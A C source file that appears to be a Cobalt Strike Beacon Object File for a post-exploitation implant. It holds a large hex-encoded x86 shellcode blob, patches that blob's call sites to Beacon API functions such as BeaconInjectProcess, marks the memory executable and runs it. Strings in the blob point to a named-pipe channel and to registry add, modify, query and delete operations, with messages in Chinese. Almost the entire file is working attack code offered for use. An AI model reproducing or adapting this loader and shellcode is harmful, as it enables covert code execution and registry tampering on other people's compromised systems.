#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
DECLSPEC_IMPORT HANDLE WINAPI  KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);

void chkstk() {
	return;
}

void *memcpy(void *dest, const void *src, int size)
{
	dest = KERNEL32$VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);//这里为了不破坏栈空间(破坏了程序无法运行)，申请空间存放shellcode

	char *pDest = (char*)dest;
	const char *pSrc = (const char*)src;
	for (int i = 0; i < size; ++i) {
		*pDest++ = *pSrc++;
	}
	
	return dest;
}

void* memset(void* ptr, int value, int num) {
	unsigned char* p = (unsigned char*)ptr;
	unsigned char v = value;
	int i;
	for (i = 0; i < num; i++) {
		*p++ = v;
	}
	return ptr;
}

void go(char * args, int alen) {
	HANDLE hFile;
	DWORD dwBytesRead;
	DWORD shellcodeLength = 0xb1c;
	
	unsigned char shellcode[] = "\x55\x8b\xec\x83\xec\x08\xe8\x2a\x00\x00\x00\x89\x45\xfc\x8b\x45\xfc\x83\xe8\x0b\x89\x45\xf8\x8b\x4d\xf8\x51\xe8\x1d\x00\x00\x00\x83\xc4\x04\x8b\x55\x08\x52\xe8\x8e\x03\x00\x00\x83\xc4\x04\x33\xc0\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x04\x5d\xc3\x55\x8b\xec\x83\xec\x44\xc7\x45\xd8\xd0\x0a\x00\x00\xc7\x45\xcc\x1c\x0b\x00\x00\x81\x7d\xd8\x99\x99\x99\x99\x74\x3f\x8b\x45\xd8\x89\x45\xf4\xeb\x09\x8b\x4d\xf4\x83\xc1\x02\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xcc\x77\x26\x0f\xae\xe8\x8b\x45\x08\x03\x45\xf4\x0f\xb7\x08\x8b\x55\x08\x8b\x04\x0a\x03\x45\x08\x8b\x4d\x08\x03\x4d\xf4\x0f\xb7\x11\x8b\x4d\x08\x89\x04\x11\xeb\xc9\xc7\x45\xd4\x34\x0a\x00\x00\xc7\x45\xe0\xac\x0a\x00\x00\x81\x7d\xd4\x77\x77\x77\x77\x0f\x84\x27\x01\x00\x00\xe8\x26\x01\x00\x00\x8b\x55\x08\x03\x55\xd4\x89\x55\xf8\xc7\x45\xdc\x01\x00\x00\x00\xc7\x45\xe8\x00\x00\x00\x00\xb8\x01\x00\x00\x00\x85\xc0\x0f\x84\xfe\x00\x00\x00\x83\x7d\xdc\x00\x74\x5d\x8b\x4d\xf8\x89\x4d\xe4\x8b\x55\xe4\x52\xff\x15\xd0\x08\x00\x00\x89\x45\xe8\x83\x7d\xe8\x00\x75\x0d\x8b\x45\xe4\x50\xff\x15\xd4\x08\x00\x00\x89\x45\xe8\x8b\x4d\xe4\x89\x4d\xf0\x8b\x55\xf0\x83\xc2\x01\x89\x55\xc8\x8b\x45\xf0\x8a\x08\x88\x4d\xfe\x83\x45\xf0\x01\x80\x7d\xfe\x00\x75\xee\x8b\x55\xf0\x2b\x55\xc8\x89\x55\xc4\x8b\x45\xc4\x8b\x4d\xf8\x8d\x54\x01\x01\x89\x55\xf8\x8b\x45\xf8\x8a\x08\x88\x4d\xff\x0f\xb6\x55\xff\x83\xfa\x2c\x75\x68\x8b\x45\xf8\x83\xc0\x01\x89\x45\xd0\x8b\x4d\xd0\x51\x8b\x55\xe8\x52\xff\x15\xd8\x08\x00\x00\x8b\x4d\x08\x03\x4d\xe0\x89\x01\x8b\x55\xe0\x83\xc2\x04\x89\x55\xe0\x8b\x45\xd0\x89\x45\xec\x8b\x4d\xec\x83\xc1\x01\x89\x4d\xc0\x8b\x55\xec\x8a\x02\x88\x45\xfd\x83\x45\xec\x01\x80\x7d\xfd\x00\x75\xee\x8b\x4d\xec\x2b\x4d\xc0\x89\x4d\xbc\x8b\x55\xbc\x8b\x45\xf8\x8d\x4c\x10\x02\x89\x4d\xf8\xc7\x45\xdc\x00\x00\x00\x00\xeb\x1d\x0f\xb6\x55\xff\x83\xfa\x3b\x75\x12\x8b\x45\xf8\x83\xc0\x01\x89\x45\xf8\xc7\x45\xdc\x01\x00\x00\x00\xeb\x02\xeb\x05\xe9\xf5\xfe\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\xe8\x39\x00\x00\x00\x89\x45\xfc\xe8\x6f\x00\x00\x00\xa3\xd8\x08\x00\x00\x68\xdc\x08\x00\x00\x8b\x45\xfc\x50\xff\x15\xd8\x08\x00\x00\xa3\xd0\x08\x00\x00\x68\xf0\x08\x00\x00\x8b\x4d\xfc\x51\xff\x15\xd8\x08\x00\x00\xa3\xd4\x08\x00\x00\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc7\x45\xf8\x00\x00\x00\x00\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x89\x45\xf8\x8b\x45\xf8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x50\xe8\xb7\xff\xff\xff\x89\x45\xf8\x8b\x45\xf8\x89\x45\xd8\x8b\x4d\xd8\x8b\x51\x3c\x03\x55\xf8\x89\x55\xd4\x8b\x45\xd4\x83\xc0\x78\x89\x45\xd0\x8b\x4d\xd0\x8b\x55\xf8\x03\x11\x89\x55\xf0\x8b\x45\xf0\x8b\x48\x14\x89\x4d\xcc\x8b\x55\xf0\x8b\x42\x18\x89\x45\xc8\x8b\x4d\xf0\x8b\x51\x1c\x03\x55\xf8\x89\x55\xe0\x8b\x45\xf0\x8b\x48\x20\x03\x4d\xf8\x89\x4d\xc0\x8b\x55\xf0\x8b\x42\x24\x03\x45\xf8\x89\x45\xc4\xc7\x45\xf4\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf4\x83\xc1\x01\x89\x4d\xf4\x8b\x55\xf4\x3b\x55\xcc\x0f\x83\xcf\x00\x00\x00\x8b\x45\xf4\x8b\x4d\xe0\x83\x3c\x81\x00\x75\x02\xeb\xdd\x8b\x55\xf4\x8b\x45\xe0\x8b\x0c\x90\x89\x4d\xb0\xc7\x45\xec\x00\x00\x00\x00\xeb\x09\x8b\x55\xec\x83\xc2\x01\x89\x55\xec\x8b\x45\xec\x3b\x45\xc8\x0f\x83\x92\x00\x00\x00\x8b\x4d\xec\x8b\x55\xc4\x0f\xb7\x04\x4a\x3b\x45\xf4\x75\x7e\x0f\xae\xe8\x8b\x4d\xec\x8b\x55\xc0\x8b\x04\x8a\x89\x45\xbc\x8b\x4d\xf8\x03\x4d\xbc\x89\x4d\xb8\xc7\x45\xe4\x00\x09\x00\x00\x8b\x55\xb8\x89\x55\xe8\x8b\x45\xe8\x8a\x08\x88\x4d\xff\x8b\x55\xe4\x3a\x0a\x75\x2e\x80\x7d\xff\x00\x74\x1f\x8b\x45\xe8\x8a\x48\x01\x88\x4d\xfe\x8b\x55\xe4\x3a\x4a\x01\x75\x17\x83\x45\xe8\x02\x83\x45\xe4\x02\x80\x7d\xfe\x00\x75\xcc\xc7\x45\xdc\x00\x00\x00\x00\xeb\x08\x1b\xc0\x83\xc8\x01\x89\x45\xdc\x8b\x4d\xdc\x89\x4d\xb4\x83\x7d\xb4\x00\x75\x08\x8b\x45\xb0\x03\x45\xf8\xeb\x0a\xe9\x59\xff\xff\xff\xe9\x1c\xff\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x8b\x45\x08\x50\xe8\x05\x00\x00\x00\x83\xc4\x04\x5d\xc3\x55\x8b\xec\x83\xec\x2c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc7\x45\xf0\x00\x00\x00\x00\xc7\x45\xd4\x00\x00\x00\x00\xc7\x45\xdc\x10\x09\x00\x00\x6a\x00\x8b\x45\xdc\x50\xff\x15\xac\x0a\x00\x00\x85\xc0\x75\x17\x68\x28\x09\x00\x00\x6a\x0d\xff\x15\x0c\x00\x00\x00\x83\xc4\x08\x33\xc0\xe9\x3f\x01\x00\x00\x6a\x00\x6a\x00\x6a\x03\x6a\x00\x6a\x03\x68\x00\x00\x00\xc0\x8b\x4d\xdc\x51\xff\x15\xb0\x0a\x00\x00\x89\x45\xf0\x83\x7d\xf0\xff\x75\x17\x68\x40\x09\x00\x00\x6a\x0d\xff\x15\x0c\x00\x00\x00\x83\xc4\x08\x33\xc0\xe9\x06\x01\x00\x00\xff\x15\xb4\x0a\x00\x00\x89\x45\xe8\x68\x00\x10\x00\x00\x6a\x00\x8b\x55\xe8\x52\xff\x15\xb8\x0a\x00\x00\x89\x45\xd8\x68\x00\x10\x00\x00\x6a\x00\x8b\x45\xe8\x50\xff\x15\xb8\x0a\x00\x00\x89\x45\xe0\xc7\x45\xf4\x00\x00\x00\x00\xc7\x45\xe4\x00\x00\x00\x00\xc7\x45\xf8\x00\x00\x00\x00\xc7\x45\xec\x00\x00\x00\x00\x8b\x4d\x08\x51\xff\x15\xbc\x0a\x00\x00\x83\xc0\x01\x89\x45\xe4\x6a\x00\x8d\x55\xf8\x52\x8b\x45\xe4\x50\x8b\x4d\x08\x51\x8b\x55\xf0\x52\xff\x15\xc0\x0a\x00\x00\x89\x45\xec\x83\x7d\xec\x00\x74\x08\x8b\x45\xe4\x3b\x45\xf8\x74\x10\x68\x58\x09\x00\x00\x6a\x0d\xff\x15\x0c\x00\x00\x00\x83\xc4\x08\x6a\x00\x8d\x4d\xf4\x51\x68\x00\x10\x00\x00\x8b\x55\xe0\x52\x8b\x45\xf0\x50\xff\x15\xc4\x0a\x00\x00\x89\x45\xec\x83\x7d\xec\x00\x74\x06\x83\x7d\xf4\x00\x75\x10\x68\x6c\x09\x00\x00\x6a\x0d\xff\x15\x0c\x00\x00\x00\x83\xc4\x08\x8b\x4d\xe0\x51\xe8\x3d\x00\x00\x00\x83\xc4\x04\x8b\x55\xf0\x52\xff\x15\xc8\x0a\x00\x00\x8b\x45\xd8\x50\x6a\x00\x8b\x4d\xe8\x51\xff\x15\xcc\x0a\x00\x00\x8b\x55\xe0\x52\x6a\x00\x8b\x45\xe8\x50\xff\x15\xcc\x0a\x00\x00\x33\xc0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8d\x45\xf0\x50\x8b\x4d\x08\x51\xe8\x6b\x01\x00\x00\x83\xc4\x08\xba\x04\x00\x00\x00\x6b\xc2\x00\x8b\x4c\x05\xf0\x51\xe8\x9a\x02\x00\x00\x83\xc4\x04\x89\x45\xe8\xba\x04\x00\x00\x00\xc1\xe2\x00\xb8\x01\x00\x00\x00\x6b\xc8\x00\x8b\x54\x15\xf0\x0f\xbe\x04\x0a\x83\xe8\x30\x74\x06\xc6\x45\xee\x01\xeb\x04\xc6\x45\xee\x00\x8a\x4d\xee\x88\x4d\xef\xc7\x45\xe0\x7c\x09\x00\x00\xc7\x45\xe4\x84\x09\x00\x00\x8b\x55\x08\x52\x68\x8c\x09\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x0c\x83\x7d\xe8\x00\x74\x0c\x83\x7d\xe8\x03\x74\x06\x83\x7d\xe8\x06\x75\x1e\x0f\xb6\x45\xef\x8b\x4c\x85\xe0\x51\x68\x98\x09\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x0c\xe9\xc3\x00\x00\x00\x83\x7d\xe8\x01\x74\x0c\x83\x7d\xe8\x04\x74\x06\x83\x7d\xe8\x07\x75\x1e\x0f\xb6\x55\xef\x8b\x44\x95\xe0\x50\x68\xac\x09\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x0c\xe9\x93\x00\x00\x00\x83\x7d\xe8\x02\x74\x0c\x83\x7d\xe8\x05\x74\x06\x83\x7d\xe8\x08\x75\x4a\x0f\xb6\x4d\xef\x85\xc9\x74\x27\xba\x04\x00\x00\x00\xd1\xe2\x8b\x44\x15\xf0\x50\x0f\xb6\x4d\xef\x8b\x54\x8d\xe0\x52\x68\xc0\x09\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x10\xeb\x19\x0f\xb6\x45\xef\x8b\x4c\x85\xe0\x51\x68\xf4\x09\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x0c\xeb\x37\x83\x7d\xe8\x09\x74\x06\x83\x7d\xe8\x0a\x75\x1b\x0f\xb6\x55\xef\x8b\x44\x95\xe0\x50\x68\x08\x0a\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x0c\xeb\x10\x68\x1c\x0a\x00\x00\x6a\x00\xff\x15\x0c\x00\x00\x00\x83\xc4\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x20\x8b\x45\x08\x89\x45\xf4\x8b\x4d\xf4\x83\xc1\x01\x89\x4d\xe8\x8b\x55\xf4\x8a\x02\x88\x45\xff\x83\x45\xf4\x01\x80\x7d\xff\x00\x75\xee\x8b\x4d\xf4\x2b\x4d\xe8\x89\x4d\xe4\x8b\x55\xe4\x89\x55\xe0\xc7\x45\xf8\x00\x00\x00\x00\xc7\x45\xf0\x00\x00\x00\x00\xc7\x45\xec\x00\x00\x00\x00\xeb\x09\x8b\x45\xf8\x83\xc0\x01\x89\x45\xf8\x8b\x4d\xf8\x3b\x4d\xe0\x0f\x8d\x8d\x00\x00\x00\x8b\x55\x08\x03\x55\xf8\x0f\xbe\x02\x83\xf8\x3b\x75\x7a\x8b\x4d\x08\x03\x4d\xf8\x0f\xbe\x51\x01\x83\xfa\x3b\x75\x6b\x68\x00\x10\x00\x00\x6a\x00\xff\x15\xb4\x0a\x00\x00\x50\xff\x15\xb8\x0a\x00\x00\x8b\x4d\xf0\x8b\x55\x0c\x89\x04\x8a\x8b\x45\xf8\x2b\x45\xec\x50\x8b\x4d\x08\x03\x4d\xec\x51\x8b\x55\xf0\x8b\x45\x0c\x8b\x0c\x90\x51\xe8\x3a\x00\x00\x00\x83\xc4\x0c\x8b\x55\xf8\x2b\x55\xec\x8b\x45\xf0\x8b\x4d\x0c\x8b\x04\x81\xc6\x04\x10\x00\x8b\x4d\xf8\x83\xc1\x02\x89\x4d\xec\x8b\x55\xf0\x83\xc2\x01\x89\x55\xf0\x8b\x45\xf8\x83\xc0\x01\x89\x45\xf8\xe9\x5e\xff\xff\xff\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x0c\x8b\x45\x08\x89\x45\xf8\x8b\x4d\x0c\x89\x4d\xf4\xc7\x45\xfc\x00\x00\x00\x00\xeb\x09\x8b\x55\xfc\x83\xc2\x01\x89\x55\xfc\x8b\x45\xfc\x3b\x45\x10\x73\x1e\x8b\x4d\xf8\x8b\x55\xf4\x8a\x02\x88\x01\x8b\x4d\xf8\x83\xc1\x01\x89\x4d\xf8\x8b\x55\xf4\x83\xc2\x01\x89\x55\xf4\xeb\xd1\x8b\x45\x08\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x0c\xc7\x45\xf8\x00\x00\x00\x00\xc7\x45\xf4\x01\x00\x00\x00\x8b\x45\x08\x89\x45\xfc\x8b\x4d\xfc\x0f\xbe\x11\x83\xfa\x20\x75\x0b\x8b\x45\xfc\x83\xc0\x01\x89\x45\xfc\xeb\xea\x8b\x4d\xfc\x0f\xbe\x11\x83\xfa\x2b\x75\x0b\x8b\x45\xfc\x83\xc0\x01\x89\x45\xfc\xeb\x1b\x8b\x4d\xfc\x0f\xbe\x11\x83\xfa\x2d\x75\x10\xc7\x45\xf4\xff\xff\xff\xff\x8b\x45\xfc\x83\xc0\x01\x89\x45\xfc\x8b\x4d\xfc\x0f\xbe\x11\x83\xfa\x30\x7c\x27\x8b\x45\xfc\x0f\xbe\x08\x83\xf9\x39\x7f\x1c\x6b\x55\xf8\x0a\x8b\x45\xfc\x0f\xbe\x08\x8d\x54\x0a\xd0\x89\x55\xf8\x8b\x45\xfc\x83\xc0\x01\x89\x45\xfc\xeb\xce\x8b\x45\xf8\x0f\xaf\x45\xf4\x8b\xe5\x5d\xc3\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x47\x65\x74\x4d\x6f\x64\x75\x6c\x65\x48\x61\x6e\x64\x6c\x65\x41\x00\x00\x00\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x00\x00\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x00\x5c\x5c\x2e\x5c\x70\x69\x70\x65\x5c\x49\x6d\x70\x72\x6f\x76\x65\x6d\x65\x6e\x74\x00\x00\x00\x00\xce\xb4\xc6\xf4\xb6\xaf\xd7\xa2\xb2\xe1\xb1\xed\xd7\xa2\xc8\xeb\xb9\xa6\xc4\xdc\x00\x00\x00\x00\x4f\x70\x65\x6e\x20\x52\x65\x61\x64\x20\x50\x69\x70\x65\x20\x45\x72\x72\x6f\x72\x00\x00\x00\x00\x57\x72\x69\x74\x65\x46\x69\x6c\x65\x20\x66\x61\x69\x6c\x65\x64\x00\x00\x00\x00\x52\x65\x61\x64\x46\x69\x6c\x65\x20\x66\x61\x69\x6c\x65\x64\x00\xca\xa7\xb0\xdc\x00\x00\x00\x00\xb3\xc9\xb9\xa6\x00\x00\x00\x00\x72\x65\x70\x6c\x79\x3a\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xcc\xed\xbc\xd3\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xd0\xde\xb8\xc4\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xb2\xe9\xd1\xaf\x25\x73\x2c\x20\xb2\xe9\xd1\xaf\xb5\xc4\xd6\xb5\xce\xaa\x3a\x25\x73\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xb2\xe9\xd1\xaf\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xb2\xe9\xd1\xaf\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xbc\xfc\xd6\xb5\xc9\xbe\xb3\xfd\x25\x73\x00\x00\x00\x00\xd7\xa2\xb2\xe1\xb1\xed\xb2\xbb\xd6\xa7\xb3\xd6\xb5\xb1\xc7\xb0\xb2\xd9\xd7\xf7\xca\xfd\x00\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x2c\x57\x61\x69\x74\x4e\x61\x6d\x65\x64\x50\x69\x70\x65\x41\x00\x2c\x43\x72\x65\x61\x74\x65\x46\x69\x6c\x65\x41\x00\x2c\x47\x65\x74\x50\x72\x6f\x63\x65\x73\x73\x48\x65\x61\x70\x00\x2c\x48\x65\x61\x70\x41\x6c\x6c\x6f\x63\x00\x2c\x6c\x73\x74\x72\x6c\x65\x6e\x41\x00\x2c\x57\x72\x69\x74\x65\x46\x69\x6c\x65\x00\x2c\x52\x65\x61\x64\x46\x69\x6c\x65\x00\x2c\x43\x6c\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x2c\x48\x65\x61\x70\x46\x72\x65\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x04\x02\x01\x05\x02\x07\x06\x0a\x02\x0f\x05\xfb\x04\x14\x02\x96\x06\x19\x02\x7b\x07\xa3\x04\x2c\x04\x30\x05\x37\x06\x3a\x04\xbd\x06\x40\x05\xc1\x04\x49\x03\xcc\x05\xcf\x06\x50\x05\x52\x04\xd3\x05\xd7\x04\xdc\x05\x64\x01\x66\x04\xec\x03\xef\x00\xf1\x01\x74\x07\xf6\x01\xf8\x03\x7a\x04\x7b\x06";
	
	HANDLE hHeap = KERNEL32$GetProcessHeap();
	DWORD funcOffsetAddr = (DWORD)KERNEL32$HeapAlloc(hHeap, 0, 0x200);
	DWORD offsetArr[0x16] = { 0 };
	DWORD funcArr[0x16] = { (DWORD)BeaconDataParse, (DWORD)BeaconDataInt, (DWORD)BeaconDataShort, (DWORD)BeaconDataLength, (DWORD)BeaconDataExtract, (DWORD)BeaconFormatAlloc, (DWORD)BeaconFormatReset, (DWORD)BeaconFormatFree, (DWORD)BeaconFormatAppend, (DWORD)BeaconFormatPrintf, (DWORD)BeaconFormatToString, (DWORD)BeaconFormatInt, (DWORD)BeaconPrintf, (DWORD)BeaconOutput, (DWORD)BeaconUseToken, (DWORD)BeaconRevertToken, (DWORD)BeaconIsAdmin, (DWORD)BeaconGetSpawnTo, (DWORD)BeaconInjectProcess, (DWORD)BeaconInjectTemporaryProcess, (DWORD)BeaconCleanupProcess, (DWORD)toWideChar };

	for (int i = 0; i < shellcodeLength - 6; i++)
	{
		DWORD funcIndex = *(PDWORD)(shellcode + i + 2);
		if (*(PWORD)(shellcode + i) == 0x15FF && funcIndex <= 0x15)
		{
			if (offsetArr[funcIndex] == 0)
			{
				offsetArr[funcIndex] = funcOffsetAddr;
				*(PDWORD)funcOffsetAddr = funcArr[funcIndex];
				funcOffsetAddr += 4;
			}
			
			*(PDWORD)(shellcode + i + 2) = offsetArr[funcIndex];
			i += 5;
		}
	}

	DWORD old_protect;
	KERNEL32$VirtualProtect(shellcode, shellcodeLength, PAGE_EXECUTE_READWRITE, &old_protect);

	void(*func)(char*);
	func = (void(*)(char*))shellcode;
	func(args);
}